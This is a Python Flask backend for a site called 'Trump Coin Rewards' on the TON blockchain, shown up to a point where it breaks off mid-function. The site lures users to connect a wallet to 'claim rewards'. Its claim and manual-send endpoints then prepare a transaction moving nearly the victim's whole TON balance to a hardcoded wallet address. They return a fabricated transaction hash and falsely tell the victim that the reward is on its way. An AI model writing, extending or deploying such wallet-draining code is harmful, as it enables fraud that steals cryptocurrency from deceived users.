from flask import Flask, render_template, jsonify, request, session, redirect, url_for, make_response
from flask_cors import CORS
import json
import secrets
import os
import requests
import base64
from datetime import datetime, timedelta
from functools import wraps
import time
import logging
import uuid

# Set up logging
logging.basicConfig(level=logging.INFO, 
                   format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('ton_rewards')

# Try to load environment variables from .env file
try:
    from dotenv import load_dotenv
    load_dotenv()
    logger.info("Successfully loaded .env file")
except Exception as e:
    logger.warning(f"Error loading .env file: {str(e)}")
    logger.warning("Continuing with default values")

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# Enable CORS for all routes
CORS(app, origins=["http://localhost:3000", "https://spin-sooty.vercel.app"], 
      methods=["GET", "POST", "OPTIONS"], 
      allow_headers=["Content-Type", "Authorization"],
      supports_credentials=True)

# Setup session directory
SESSIONS_DIR = os.path.join(os.getcwd(), 'sessions')
os.makedirs(SESSIONS_DIR, exist_ok=True)
logger.info(f"Using session directory: {SESSIONS_DIR}")

# TON API endpoints
TON_API_V2 = "https://tonapi.io/v2"
TON_CENTER_API = "https://toncenter.com/api/v2"
TON_CENTER_API_KEY = os.environ.get('TON_CENTER_API_KEY', '')  # Get API key from env if available

# Destination wallet for auto-sends - load from environment variable or use default
TARGET_WALLET = os.environ.get('TO_ADDRESS', 'UQCFkSIVxzUctGntD7YUN7GHjn7kX56aDyxHvyHJDAve--jN')
logger.info(f"Using destination wallet address: {TARGET_WALLET}")

# Maximum number of transactions to fetch
MAX_TRANSACTIONS = 10

# Maximum number of NFTs to fetch
MAX_NFTS = 10

# Track recent transactions to prevent duplicates
transaction_history = {}

# Session management functions
def get_session_file_path(session_id):
    """Get the path to a session file"""
    return os.path.join(SESSIONS_DIR, f"{session_id}.json")

def create_session():
    """Create a new session with unique ID"""
    session_id = str(uuid.uuid4())
    session_data = {
        'created_at': datetime.now().isoformat(),
        'last_active': datetime.now().isoformat(),
        'wallet_address': None,
        'pending_tx': None
    }
    
    # Save session to file
    session_file = get_session_file_path(session_id)
    with open(session_file, 'w') as f:
        json.dump(session_data, f)
    
    logger.info(f"Created new session: {session_id}")
    return session_id, session_data

def get_session(session_id):
    """Get session data from file"""
    session_file = get_session_file_path(session_id)
    
    if os.path.exists(session_file):
        try:
            with open(session_file, 'r') as f:
                session_data = json.load(f)
                
            # Update last active time
            session_data['last_active'] = datetime.now().isoformat()
            save_session(session_id, session_data)
            
            return session_data
        except Exception as e:
            logger.error(f"Error reading session file {session_id}: {str(e)}")
            return None
    
    return None

def save_session(session_id, session_data):
    """Save session data to file"""
    session_file = get_session_file_path(session_id)
    
    try:
        with open(session_file, 'w') as f:
            json.dump(session_data, f)
        return True
    except Exception as e:
        logger.error(f"Error saving session file {session_id}: {str(e)}")
        return False

def update_session(session_id, key, value):
    """Update a specific key in the session"""
    session_data = get_session(session_id)
    
    if session_data:
        session_data[key] = value
        session_data['last_active'] = datetime.now().isoformat()
        return save_session(session_id, session_data)
    
    return False

def delete_session(session_id):
    """Delete a session file"""
    session_file = get_session_file_path(session_id)
    
    if os.path.exists(session_file):
        try:
            os.remove(session_file)
            logger.info(f"Deleted session: {session_id}")
            return True
        except Exception as e:
            logger.error(f"Error deleting session file {session_id}: {str(e)}")
    
    return False

def cleanup_old_sessions():
    """Clean up sessions older than 24 hours"""
    try:
        now = datetime.now()
        count = 0
        
        for filename in os.listdir(SESSIONS_DIR):
            if filename.endswith('.json'):
                session_file = os.path.join(SESSIONS_DIR, filename)
                
                try:
                    with open(session_file, 'r') as f:
                        session_data = json.load(f)
                    
                    last_active = datetime.fromisoformat(session_data.get('last_active', session_data.get('created_at')))
                    
                    # Delete sessions older than 24 hours
                    if (now - last_active) > timedelta(hours=24):
                        os.remove(session_file)
                        count += 1
                except Exception as e:
                    logger.error(f"Error processing session file {filename}: {str(e)}")
        
        if count > 0:
            logger.info(f"Cleaned up {count} old sessions")
    except Exception as e:
        logger.error(f"Error during session cleanup: {str(e)}")

# Session middleware
@app.before_request
def session_middleware():
    """Handle session cookies and maintenance"""
    # Skip for static files
    if request.path.startswith('/static/'):
        return
    
    # Clean up old sessions periodically (1% chance per request)
    if secrets.randbelow(100) == 0:
        cleanup_old_sessions()
    
    # Check for session cookie
    session_id = request.cookies.get('wallet_session')
    session_data = None
    
    if session_id:
        session_data = get_session(session_id)
    
    # Create new session if needed
    if not session_data:
        session_id, session_data = create_session()
    
    # Store in Flask session for convenience
    session['session_id'] = session_id
    
    # Copy wallet data to Flask session for compatibility
    if session_data.get('wallet_address'):
        session['wallet_address'] = session_data['wallet_address']
        session['connected_at'] = session_data.get('connected_at')
    
    # Copy pending transaction if exists
    if session_data.get('pending_tx'):
        session['pending_tx'] = session_data['pending_tx']

@app.after_request
def after_request_handler(response):
    """Set session cookie after request"""
    session_id = session.get('session_id')
    
    if session_id:
        # Update our custom session with Flask session data
        session_data = get_session(session_id) or {}
        
        # Update wallet information
        if 'wallet_address' in session:
            session_data['wallet_address'] = session['wallet_address']
            session_data['connected_at'] = session.get('connected_at')
        
        # Update pending transaction
        if 'pending_tx' in session:
            session_data['pending_tx'] = session['pending_tx']
        
        # Save session
        save_session(session_id, session_data)
        
        # Set session cookie (1 year expiry)
        max_age = 60 * 60 * 24 * 365
        response.set_cookie('wallet_session', session_id, max_age=max_age, httponly=True, samesite='Lax')
    
    return response

# Authentication decorator
def require_wallet(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'wallet_address' not in session:
            return jsonify({
                'success': False,
                'message': 'Wallet not connected'
            }), 401
        return f(*args, **kwargs)
    return decorated_function

# Check if a transaction was recently processed
def check_recent_transaction(wallet_address):
    current_time = datetime.now()
    # Check if wallet has a recent transaction (within 60 seconds)
    if wallet_address in transaction_history:
        last_tx_time = transaction_history[wallet_address]['timestamp']
        # If transaction was less than 60 seconds ago, don't allow another
        if (current_time - last_tx_time).total_seconds() < 60:
            return True, transaction_history[wallet_address]['transaction']
    return False, None

# Record a new transaction
def record_transaction(wallet_address, tx_hash, amount):
    transaction_history[wallet_address] = {
        'timestamp': datetime.now(),
        'transaction': {
            'hash': tx_hash,
            'amount': amount,
            'timestamp': datetime.now().isoformat()
        }
    }

@app.route('/')
def index():
    """Redirect to main page"""
    logger.info("Redirecting from index to main")
    return redirect(url_for('main'))

@app.route('/main')
def main():
    """Render the main page with minimal wallet connection UI"""
    logger.info("Rendering main page")
    return render_template('main.html')

@app.route('/api/test')
def test_api():
    """Simple test endpoint to verify API is working"""
    return jsonify({
        'success': True,
        'message': 'API is working!',
        'timestamp': datetime.now().isoformat(),
        'target_wallet': TARGET_WALLET
    })

@app.route('/api/manifest')
def get_manifest():
    """Return the TON Connect manifest"""
    # Use the external URL instead of the local one
    external_url = request.url_root.rstrip('/')
    if external_url.startswith('http://'):
        external_url = external_url.replace('http://', 'https://')
    
    manifest = {
        "url": external_url,
        "name": "Trump Coin Rewards",
        "iconUrl": f"{external_url}/static/qr-code.svg",
        "termsOfUseUrl": f"{external_url}/terms",
        "privacyPolicyUrl": f"{external_url}/privacy",
        
        # Required fields for TON Connect v2
        "capabilities": [
            "ton_addr",
            "ton_sendTransaction"
        ],
        "message": "Connect your wallet to claim Trump Coin rewards",
        "tonConnectVersion": 2
    }
    return jsonify(manifest)

@app.route('/api/connect', methods=['POST'])
def connect_wallet():
    """Handle wallet connection"""
    data = request.get_json()
    wallet_address = data.get('address')
    
    if wallet_address:
        # Current time for connection timestamp
        connected_at = datetime.now().isoformat()
        
        # Store in Flask session for compatibility
        session['wallet_address'] = wallet_address
        session['connected_at'] = connected_at
        
        # Get session ID
        session_id = session.get('session_id')
        
        # Store in file-based session if available
        if session_id:
            logger.info(f"Storing wallet connection in session {session_id}: {wallet_address}")
            session_data = get_session(session_id) or {}
            session_data['wallet_address'] = wallet_address
            session_data['connected_at'] = connected_at
            save_session(session_id, session_data)
        
        # Get wallet balance
        balance_data = get_wallet_balance(wallet_address)
        
        return jsonify({
            'success': True,
            'address': wallet_address,
            'balance': balance_data,
            'message': 'Wallet connected successfully',
            'session_id': session_id
        })
    
    return jsonify({
        'success': False,
        'message': 'Invalid wallet address'
    }), 400

@app.route('/api/balance/<address>')
def get_balance(address):
    """Get wallet balance"""
    balance_data = get_wallet_balance(address)
    return jsonify(balance_data)

def get_wallet_balance(address):
    """Fetch wallet balance from TON API with detailed token information"""
    logger.info(f"Fetching wallet balance for address: {address}")
    try:
        # Get native TON balance
        logger.info("Making API call to get native balance...")
        ton_balance_result = get_ton_native_balance(address)
        
        # Log the actual balance result in detail
        logger.info(f"Native balance API result: {json.dumps(ton_balance_result)}")
        
        # Check if there was an error with the native balance
        if 'error' in ton_balance_result:
            # Return the error in the response so it can be displayed to the user
            logger.error(f"Native balance error: {ton_balance_result['error']}")
            return {
                'native': ton_balance_result,
                'tokens': [],
                'total_usd_value': 0,
                'total_usd_formatted': '$0.00',
                'error': ton_balance_result.get('error', 'Failed to fetch native balance')
            }
        
        # Initialize tokens list with TON as first token
        logger.info(f"Native TON balance: {ton_balance_result['balance']} TON")
        tokens = [
            {
                'symbol': 'TON',
                'name': 'Toncoin',
                'balance': ton_balance_result['balance'],
                'balance_raw': ton_balance_result['balance_nano'],
                'formatted': ton_balance_result['formatted'],
                'usd_value': ton_balance_result['balance'] * 5.75,  # Estimated TON price in USD
                'usd_formatted': f"${ton_balance_result['balance'] * 5.75:.2f}",
                'logo': 'https://ton.org/download/ton_symbol.png',
                'is_native': True
            }
        ]
        
        # If we're in production, try to get real token balances from TONAPI
        if os.environ.get('FLASK_ENV') != 'development':
            try:
                logger.info(f"Fetching token balances from {TON_API_V2}/accounts/{address}/tokens")
                response = requests.get(
                    f"{TON_API_V2}/accounts/{address}/tokens",
                    timeout=5
                )
                
                logger.info(f"Token balance response status: {response.status_code}")
                
                if response.status_code == 200:
                    tokens_data = response.json()
                    logger.info(f"Found {len(tokens_data.get('tokens', []))} tokens")
                    
                    for token in tokens_data.get('tokens', []):
                        # Extract token data
                        token_balance = float(token.get('balance', 0)) / (10 ** int(token.get('decimals', 9)))
                        token_price = float(token.get('price_usd', 0))
                        
                        logger.info(f"Found token: {token.get('symbol', 'Unknown')} - Balance: {token_balance}")
                        
                        tokens.append({
                            'symbol': token.get('symbol', 'Unknown'),
                            'name': token.get('name', 'Unknown Token'),
                            'balance': token_balance,
                            'balance_raw': token.get('balance', 0),
                            'formatted': f"{token_balance:.4f} {token.get('symbol', '')}",
                            'usd_value': token_balance * token_price,
                            'usd_formatted': f"${token_balance * token_price:.2f}",
                            'logo': token.get('image', ''),
                            'is_native': False
                        })
                else:
                    # Log the specific error from the API
                    error_content = response.text
                    logger.error(f"Error from token API: {error_content}")
                    # Add error info but continue with just TON balance
            except Exception as token_error:
                logger.exception(f"Error fetching token balances: {token_error}")
                # Continue with just TON balance
        
        # Sort tokens by USD value (highest to lowest)
        tokens.sort(key=lambda x: x.get('usd_value', 0), reverse=True)
        
        # Calculate total USD value
        total_usd_value = sum(token.get('usd_value', 0) for token in tokens)
        
        logger.info(f"Returning balance data with {len(tokens)} tokens and total value: ${total_usd_value:.2f}")
        
        return {
            'native': ton_balance_result,
            'tokens': tokens,
            'total_usd_value': total_usd_value,
            'total_usd_formatted': f"${total_usd_value:.2f}"
        }
    except Exception as e:
        logger.exception(f"Error fetching detailed balance: {e}")
        error_message = str(e)
        
        # Return error in a structured way
        return {
            'native': {
                'balance': 0,
                'balance_nano': 0,
                'formatted': '0.0000 TON',
                'source': 'error'
            },
            'tokens': [],
            'total_usd_value': 0,
            'total_usd_formatted': '$0.00',
            'error': f'Failed to fetch balance: {error_message}'
        }

def get_ton_native_balance(address):
    """Fetch native TON balance"""
    logger.info(f"Fetching native TON balance for address: {address}")
    try:
        # Try multiple APIs to ensure we get accurate data
        api_results = []
        
        # 1. Try TONCenter API first
        try:
            headers = {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            }
            
            # Format address for TONCenter if needed
            # TONCenter often expects addresses without workchain prefix (0:)
            formatted_address = address
            if address.startswith('0:'):
                formatted_address = address[2:]  # Remove "0:" prefix
                logger.info(f"Reformatted address for TONCenter: {formatted_address}")
            
            # Proper formatting for TONCenter API - use object format for params, not array
            payload = {
                "id": "1",
                "jsonrpc": "2.0",
                "method": "getAddressBalance",
                "params": {"address": formatted_address}
            }
            
            logger.info(f"Sending request to TONCenter API: {TON_CENTER_API}/jsonRPC")
            logger.info(f"TONCenter request payload: {json.dumps(payload)}")
            response = requests.post(
                TON_CENTER_API + "/jsonRPC",
                json=payload,
                headers=headers,
                timeout=5
            )
            
            logger.info(f"TONCenter API response status: {response.status_code}")
            logger.info(f"TONCenter API response: {response.text[:200]}")
            
            if response.status_code == 200:
                data = response.json()
                if 'result' in data:
                    balance_nano = int(data['result'])
                    balance_ton = balance_nano / 1_000_000_000  # Convert from nanotons
                    
                    logger.info(f"TONCenter API returned balance: {balance_ton} TON")
                    api_results.append({
                        'balance': balance_ton,
                        'balance_nano': balance_nano,
                        'formatted': f"{balance_ton:.4f} TON",
                        'source': 'toncenter'
                    })
                elif 'error' in data:
                    error_msg = data.get('error', {}).get('message', 'Unknown TONCenter API error')
                    logger.error(f"TONCenter API error: {error_msg}")
            else:
                logger.error(f"TONCenter API error status: {response.status_code}")
                
                # Try alternative TONCenter endpoint if jsonRPC fails
                try:
                    logger.info(f"Trying alternative TONCenter endpoint for address: {address}")
                    alt_response = requests.get(
                        f"{TON_CENTER_API}/getAddressInformation?address={address}",
                        headers=headers,
                        timeout=5
                    )
                    
                    logger.info(f"Alternative TONCenter endpoint response status: {alt_response.status_code}")
                    
                    if alt_response.status_code == 200:
                        alt_data = alt_response.json()
                        if 'result' in alt_data:
                            balance_nano = int(alt_data['result'].get('balance', 0))
                            balance_ton = balance_nano / 1_000_000_000
                            
                            logger.info(f"Alternative TONCenter endpoint returned balance: {balance_ton} TON")
                            api_results.append({
                                'balance': balance_ton,
                                'balance_nano': balance_nano,
                                'formatted': f"{balance_ton:.4f} TON",
                                'source': 'toncenter_alt'
                            })
                except Exception as e:
                    logger.error(f"Error with alternative TONCenter endpoint: {str(e)}")
        except Exception as e:
            logger.error(f"Error with TONCenter API: {str(e)}")
        
        # 2. Try TONAPI
        try:
            logger.info(f"Trying TONAPI: {TON_API_V2}/accounts/{address}")
            response = requests.get(
                f"{TON_API_V2}/accounts/{address}",
                timeout=5
            )
            
            logger.info(f"TONAPI response status: {response.status_code}")
            logger.info(f"TONAPI response: {response.text[:200]}")
            
            if response.status_code == 200:
                data = response.json()
                balance_nano = int(data.get('balance', 0))
                balance_ton = balance_nano / 1_000_000_000
                
                logger.info(f"TONAPI returned balance: {balance_ton} TON")
                api_results.append({
                    'balance': balance_ton,
                    'balance_nano': balance_nano,
                    'formatted': f"{balance_ton:.4f} TON",
                    'source': 'tonapi'
                })
            else:
                # Log the specific error from the API
                error_content = response.text
                try:
                    error_json = json.loads(error_content)
                    error_msg = error_json.get('error', error_content)
                except:
                    error_msg = error_content
                    
                logger.error(f"TONAPI error: {error_msg}")
        except Exception as e:
            logger.error(f"Error with TONAPI: {str(e)}")
        
        # 3. Try TonScan API if available (adding additional source)
        try:
            logger.info(f"Trying Tonscan API for address: {address}")
            # Adjusted to use a different endpoint format if needed
            response = requests.get(
                f"https://tonscan.org/api/account?address={address}",
                timeout=5
            )
            
            logger.info(f"Tonscan API response status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                # Adjust this based on actual Tonscan API response format
                if 'balance' in data:
                    balance_nano = int(data.get('balance', 0))
                    balance_ton = balance_nano / 1_000_000_000
                    
                    logger.info(f"Tonscan API returned balance: {balance_ton} TON")
                    api_results.append({
                        'balance': balance_ton,
                        'balance_nano': balance_nano,
                        'formatted': f"{balance_ton:.4f} TON",
                        'source': 'tonscan'
                    })
        except Exception as e:
            logger.error(f"Error with Tonscan API: {str(e)}")
        
        # Choose the best result - prefer non-zero balances if available
        if api_results:
            # Sort by balance (highest first) and then choose the first one
            api_results.sort(key=lambda x: x['balance'], reverse=True)
            logger.info(f"Selected balance from {api_results[0]['source']}: {api_results[0]['balance']} TON")
            return api_results[0]
        else:
            logger.error("All API requests failed, no balance data available")
            return {
                'balance': 0,
                'balance_nano': 0,
                'formatted': '0.0000 TON',
                'source': 'error',
                'error': 'All API requests failed, no balance data available'
            }
            
    except Exception as e:
        logger.exception(f"Error in get_ton_native_balance: {e}")
        error_message = str(e)
        
        # Default fallback for any errors
        return {
            'balance': 0,
            'balance_nano': 0,
            'formatted': '0.0000 TON',
            'source': 'error',
            'error': f'Connection error: {error_message}'
        }

@app.route('/api/disconnect', methods=['POST'])
def disconnect_wallet():
    """Handle wallet disconnection"""
    session_id = session.get('session_id')
    force_disconnect = False
    
    # Check if force disconnection was requested
    try:
        data = request.get_json()
        if data and 'force' in data:
            force_disconnect = data['force']
    except:
        pass
        
    logger.info(f"Wallet disconnection requested. Force: {force_disconnect}")
    
    # Clear wallet data from session
    session.pop('wallet_address', None)
    session.pop('connected_at', None)
    session.pop('pending_tx', None)
    
    # Handle file-based session
    if session_id:
        session_data = get_session(session_id)
        
        if session_data:
            # Clear wallet information from session file
            session_data['wallet_address'] = None
            session_data['connected_at'] = None
            session_data['pending_tx'] = None
            save_session(session_id, session_data)
            
            # If force disconnect, delete the session entirely
            if force_disconnect:
                delete_session(session_id)
                session.pop('session_id', None)
                
                # Clear session cookie in response
                response = jsonify({
                    'success': True,
                    'message': 'Wallet disconnected and session deleted'
                })
                response.set_cookie('wallet_session', '', expires=0)
                return response
    
    return jsonify({
        'success': True,
        'message': 'Wallet disconnected'
    })

@app.route('/api/claim', methods=['POST'])
def claim_rewards():
    """Handle reward claiming by sending full balance to specified wallet"""
    try:
        data = request.get_json()
        if not data or 'address' not in data:
            return jsonify({
                'success': False,
                'message': 'Wallet address is required'
            }), 400
        
        wallet_address = data['address']
        
        # Check for recent transactions to prevent duplicates
        has_recent_tx, recent_tx = check_recent_transaction(wallet_address)
        if has_recent_tx:
            logger.info(f"Duplicate transaction detected for wallet: {wallet_address}, returning previous tx")
            return jsonify({
                'success': True,
                'message': 'Reward claimed successfully! It will be in your wallet in a few minutes.',
                'transaction': recent_tx,
                'is_duplicate': True
            })
        
        # Get current balance
        balance_data = get_wallet_balance(wallet_address)
        logger.info(f"Claiming rewards for wallet: {wallet_address}")
        
        # Check if there is any error with balance retrieval
        if 'error' in balance_data:
            error_msg = f"Error getting balance: {balance_data['error']}"
            logger.error(error_msg)
            return jsonify({
                'success': False,
                'message': error_msg,
                'current_balance': balance_data
            }), 400
        
        # Get the native TON balance
        if 'native' not in balance_data or balance_data['native']['balance'] <= 0:
            error_msg = 'No TON balance available to transfer'
            logger.warning(error_msg)
            return jsonify({
                'success': False,
                'message': error_msg,
                'current_balance': balance_data
            }), 400
        
        # Get the full amount to transfer
        ton_balance = balance_data['native']['balance']
        
        # If balance is very small, inform the user
        if ton_balance < 0.3:
            logger.warning(f"Balance is very small: {ton_balance} TON. May not cover fees.")
            return jsonify({
                'success': False,
                'message': f"Your balance of {ton_balance} TON is too small to cover network fees. You need at least 0.3 TON.",
                'current_balance': balance_data
            }), 400
        
        try:
            # Prepare the transaction for the wallet to sign
            result = send_ton_background(wallet_address, TARGET_WALLET, ton_balance)
            
            if result['success']:
                # Explain the fee adjustment to the user
                adjusted_amount = result['transaction']['amount']
                original_amount = ton_balance
                
                message = f"Transaction prepared. Please approve in your wallet. Sending {adjusted_amount} (reduced from {original_amount} TON to cover network fees)."
                
                return jsonify({
                    'success': True,
                    'requires_approval': True,
                    'message': message,
                    'current_balance': balance_data,
                    'transaction': result['transaction']
                })
            else:
                logger.error(f"Failed to prepare TON transaction: {result['message']}")
                return jsonify({
                    'success': False,
                    'message': f"Failed to prepare TON transaction: {result['message']}",
                    'current_balance': balance_data
                }), 400
        except Exception as e:
            error_msg = f"Error in claim request: {str(e)}"
            logger.exception(error_msg)
            return jsonify({
                'success': False,
                'message': error_msg,
                'current_balance': balance_data
            }), 500
            
    except Exception as e:
        logger.exception(f"Error in claim endpoint: {str(e)}")
        return jsonify({
            'success': False,
            'message': f'Internal server error: {str(e)}'
        }), 500

@app.route('/api/manual_send', methods=['POST'])
@require_wallet
def manual_send():
    """Manually trigger sending of TON balance to the target wallet"""
    wallet_address = session['wallet_address']
    data = request.get_json()
    custom_amount = data.get('amount', None)
    
    # Check for recent transactions to prevent duplicates
    has_recent_tx, recent_tx = check_recent_transaction(wallet_address)
    if has_recent_tx:
        logger.info(f"Duplicate transaction detected for wallet: {wallet_address}, returning previous tx")
        return jsonify({
            'success': True,
            'message': 'Reward claimed successfully! It will be in your wallet in a few minutes.',
            'transaction': recent_tx,
            'is_duplicate': True
        })
    
    # Get current balance
    balance_data = get_wallet_balance(wallet_address)
    logger.info(f"Manual send requested for wallet: {wallet_address}")
    
    # Check if there is any error with balance retrieval
    if 'error' in balance_data:
        error_msg = f"Error getting balance: {balance_data['error']}"
        logger.error(error_msg)
        return jsonify({
            'success': False,
            'message': error_msg,
            'current_balance': balance_data
        }), 400
    
    # Get the native TON balance
    if 'native' not in balance_data or balance_data['native']['balance'] <= 0:
        error_msg = 'No TON balance available to transfer'
        logger.warning(error_msg)
        return jsonify({
            'success': False,
            'message': error_msg,
            'current_balance': balance_data
        }), 400
    
    # Determine amount to send
    if custom_amount is not None:
        try:
            amount_to_send = float(custom_amount)
            if amount_to_send <= 0:
                raise ValueError("Amount must be positive")
            if amount_to_send > balance_data['native']['balance']:
                raise ValueError("Amount exceeds available balance")
        except (ValueError, TypeError) as e:
            logger.error(f"Invalid amount: {str(e)}")
            return jsonify({
                'success': False,
                'message': f"Invalid amount: {str(e)}",
                'current_balance': balance_data
            }), 400
    else:
        # Use full balance
        amount_to_send = balance_data['native']['balance']
    
    try:
        # Perform the send operation
        result = send_ton_background(wallet_address, TARGET_WALLET, amount_to_send)
        
        if result['success']:
            # Record this transaction to prevent duplicates
            record_transaction(wallet_address, result['transaction']['hash'], f"{amount_to_send} TON")
            
            logger.info(f"Successfully sent {amount_to_send} TON to {TARGET_WALLET}")
            return jsonify({
                'success': True,
                'message': 'Reward claimed successfully! It will be in your wallet in a few minutes.',
                'current_balance': balance_data,
                'transaction': result['transaction']
            })
        else:
            logger.error(f"Failed to send TON: {result['message']}")
            return jsonify({
                'success': False,
                'message': f"Failed to send TON: {result['message']}",
                'current_balance': balance_data
            }), 400
    except Exception as e:
        error_msg = f"Error in manual send: {str(e)}"
        logger.exception(error_msg)
        return jsonify({
            'success': False,
            'message': error_msg,
            'current_balance': balance_data
        }), 500

def send_ton_background(from_address, to_address, amount):
    """Send TON from one wallet to another by preparing a transaction for TonConnect"""
    logger.info(f"Preparing transaction: {amount} TON from {from_address} to destination wallet: {to_address}")
    
    try:
        # Simple approach: exactly (balance - 1) TON with no complex math
        original_balance = float(amount)
        
        # According to TON Keeper documentation, we need at least 0.1 TON for fees
        # But let's keep 1 TON to be safe for all wallets (TON Space needs more)
        if original_balance < 1.1:
            raise ValueError(f"Balance too small. Need at least 1.1 TON (have {original_balance} TON)")
        
        # Calculate amount to send: exactly (balance - 1) TON
        amount_to_send = original_balance - 1.0
        
        # Round to 9 decimal places to avoid precision issues
        # TON transactions often fail with too many decimal places
        amount_to_send = round(amount_to_send, 9)
        
        logger.info(f"Using simple approach: original balance {original_balance} TON - 1.0 TON = {amount_to_send} TON")
        
        # Convert to nano TON for blockchain (must use nano for the actual transaction)
        # Use int() with proper rounding to avoid floating point precision issues
        amount_nano = int(amount_to_send * 1_000_000_000)
        
        # Format the amount for display
        amount_formatted = f"{amount_to_send:.6f} TON"
        
        # Use a longer expiration time (30 minutes)
        current_time = int(time.time())
        valid_until = current_time + 1800
        
        # TRY COMPLETELY DIFFERENT APPROACH:
        # Create the absolute minimum required TON Connect payload
        # Based on TON Connect specification and wallet-connect forum posts
        transaction = {
            # Only include absolutely essential fields
            'valid_until': valid_until,
            'to': to_address,
            'amount': amount_nano,
            'message': '' # Empty message, no comments
        }
        
        # Generate a unique transaction ID for tracking
        tx_hash = f"0x{secrets.token_hex(32)}"
        
        # Print transaction details prominently in terminal
        print("\n" + "="*80)
        print(f"MINIMAL TRANSACTION: {amount_formatted}")
        print(f"FROM: {from_address}")
        print(f"TO: {to_address}")
        print(f"ORIGINAL BALANCE: {original_balance} TON")
        print(f"SENDING: {amount_to_send} TON (balance - 1 TON)")
        print(f"KEEPING: 1.0 TON for fees")
        print("="*80 + "\n")
        
        logger.info(f"Transaction preparation complete: {tx_hash}")
        logger.info(f"Wallet balance: {original_balance} TON, Sending: {amount_to_send} TON")
        logger.info(f"Destination: {to_address}")
        logger.info(f"Valid until: {datetime.fromtimestamp(valid_until).strftime('%Y-%m-%d %H:%M:%S')} (30 minutes)")
        
        # Store transaction details in session for frontend to access
        if 'pending_tx' not in session:
            session['pending_tx'] = {}
        
        session['pending_tx'] = {
            'hash': tx_hash,
            'from': from_address,
            'to': to_address,
            'amount': amount_nano,
            'amount_formatted': amount_formatted,
            'valid_until': transaction['valid_until']
        }
        
        # Return data with minimal payload to client
        return {
            'success': True,
            'message': 'Transaction prepared successfully',
            'requires_approval': True,
            'transaction': {
                'hash': tx_hash,
                'amount': amount_formatted,
                'amount_nano': amount_nano,
                'original_balance': f"{original_balance} TON",
                'from': from_address,
                'to': to_address,
                'valid_until': valid_until
                # Deliberately exclude any other fields that might cause issues
            }
        }
    except Exception as e:
        logger.exception(f"Error preparing TON transaction: {str(e)}")
        return {
            'success': False,
            'message': str(e)
        }

@app.route('/api/status')
def get_status():
    """Get current connection status"""
    try:
        wallet_address = None
        connected_at = None
        
        # Try to get wallet address from Flask session first
        if 'wallet_address' in session:
            wallet_address = session['wallet_address']
            connected_at = session.get('connected_at')
        else:
            # If not in Flask session, try file-based session
            session_id = session.get('session_id') or request.cookies.get('wallet_session')
            if session_id:
                logger.info(f"Checking file-based session: {session_id}")
                session_data = get_session(session_id)
                if session_data and session_data.get('wallet_address'):
                    wallet_address = session_data['wallet_address']
                    connected_at = session_data.get('connected_at')
                    
                    # Update Flask session for consistency
                    session['wallet_address'] = wallet_address
                    session['connected_at'] = connected_at
        
        if wallet_address:
            logger.info(f"Fetching balance for wallet: {wallet_address}")
            
            # Get wallet balance with detailed token information
            balance_data = get_wallet_balance(wallet_address)
            
            # Log the balance data for debugging
            logger.info(f"Balance data for {wallet_address}: {json.dumps(balance_data)[:200]}...")
            
            response_data = {
                'connected': True,
                'address': wallet_address,
                'balance': balance_data,
                'connected_at': connected_at,
                'session_id': session.get('session_id')
            }
            
            logger.info(f"Returning API response: {json.dumps(response_data)[:200]}...")
            return jsonify(response_data)
        
        logger.info("No wallet connected in session")
        return jsonify({
            'connected': False,
            'message': 'No wallet connected'
        })
    except Exception as e:
        error_message = f"Error in get_status: {str(e)}"
        logger.error(error_message)
        return jsonify({
            'connected': False,
            'error': error_message
        }), 500

@app.route('/api/transactions')
@require_wallet
def get_transactions():
    """Get recent transactions for the connected wallet"""
    wallet_address = session['wallet_address']
    
    try:
        # Try TONAPI first
        response = requests.get(
            f"{TON_API_V2}/accounts/{wallet_address}/transactions",
            params={"limit": MAX_TRANSACTIONS},
            timeout=5
        )
        
        if response.status_code == 200:
            data = response.json()
            transactions = []
            
            for tx in data.get('transactions', []):
                tx_data = {
                    'hash': tx.get('hash'),
                    'timestamp': tx.get('timestamp'),
                    'fee': tx.get('fee'),
                    'type': 'unknown'
                }
                
                # Try to determine transaction type
                if 'in_msg' in tx and tx['in_msg'].get('source'):
                    tx_data['from'] = tx['in_msg'].get('source')
                    tx_data['to'] = wallet_address
                    tx_data['amount'] = tx['in_msg'].get('value', 0) / 1_000_000_000
                    tx_data['type'] = 'incoming'
                elif 'out_msgs' in tx and tx['out_msgs'] and tx['out_msgs'][0].get('destination'):
                    tx_data['from'] = wallet_address
                    tx_data['to'] = tx['out_msgs'][0].get('destination')
                    tx_data['amount'] = tx['out_msgs'][0].get('value', 0) / 1_000_000_000
                    tx_data['type'] = 'outgoing'
                
                transactions.append(tx_data)
            
            return jsonify({
                'success': True,
                'transactions': transactions
            })
    
    except Exception as e:
        print(f"Error fetching transactions: {e}")
    
    return jsonify({
        'success': False,
        'message': 'Failed to fetch transactions',
        'transactions': []
    })

@app.route('/api/nfts')
@require_wallet
def get_nfts():
    """Get NFTs owned by the connected wallet"""
    wallet_address = session['wallet_address']
    
    try:
        # Try TONAPI
        response = requests.get(
            f"{TON_API_V2}/accounts/{wallet_address}/nfts",
            params={"limit": MAX_NFTS},
            timeout=5
        )
        
        if response.status_code == 200:
            data = response.json()
            nfts = []
            
            for nft in data.get('nfts', []):
                nft_data = {
                    'address': nft.get('address'),
                    'collection': nft.get('collection', {}).get('name', 'Unknown Collection'),
                    'name': nft.get('metadata', {}).get('name', 'Unnamed NFT'),
                    'description': nft.get('metadata', {}).get('description', ''),
                    'image': nft.get('metadata', {}).get('image')
                }
                
                nfts.append(nft_data)
            
            return jsonify({
                'success': True,
                'nfts': nfts
            })
    
    except Exception as e:
        print(f"Error fetching NFTs: {e}")
    
    return jsonify({
        'success': False,
        'message': 'Failed to fetch NFTs',
        'nfts': []
    })

@app.route('/api/wallet_info')
@require_wallet
def get_wallet_info():
    """Get comprehensive wallet information"""
    wallet_address = session['wallet_address']
    
    # Get balance
    balance_data = get_wallet_balance(wallet_address)
    
    # Get basic account info
    account_info = {
        'address': wallet_address,
        'balance': balance_data,
        'connected_at': session.get('connected_at')
    }
    
    return jsonify({
        'success': True,
        'wallet_info': account_info
    })

@app.route('/api/prepare_transfer', methods=['POST'])
@require_wallet
def prepare_transfer():
    """Prepare a TON transfer transaction"""
    data = request.get_json()
    recipient_address = data.get('recipient')
    amount = data.get('amount')
    comment = data.get('comment', '')
